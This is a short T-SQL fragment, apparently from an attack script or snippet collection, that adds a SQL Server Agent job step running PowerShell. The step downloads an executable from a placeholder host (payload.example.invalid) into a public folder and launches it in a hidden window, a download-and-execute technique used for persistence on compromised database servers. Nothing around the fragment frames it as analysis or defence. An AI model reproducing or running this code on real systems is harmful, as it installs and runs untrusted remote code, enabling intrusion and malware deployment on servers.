    EXEC sp_add_jobstep
        @job_name = @job_name,
        @step_name = 'Download',
        @subsystem = 'POWERSHELL',
        @command = N'$w=new-object net.webclient;$w.Proxy=$null;$w.DownloadFile("http://payload.example.invalid/down.exe","C:\Users\Public\down.exe");Start-Process -FilePath C:\Users\Public\down.exe -WindowStyle Hidden',
        @retry_attempts = 0,
        @retry_interval = 0;
